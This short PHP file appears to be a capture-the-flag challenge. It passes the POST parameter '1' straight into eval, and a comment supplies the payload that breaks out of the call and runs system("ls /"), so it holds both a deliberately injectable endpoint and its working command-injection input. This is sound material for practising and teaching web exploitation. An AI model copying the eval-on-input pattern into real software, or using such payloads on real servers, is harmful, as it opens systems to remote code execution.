<?php

#Author: h1xa

error_reporting(0);
show_source(__FILE__);

eval("var_dump((Object)$_POST[1]);");

?>

<!-- POST请求:  1=1);system("ls /");// -->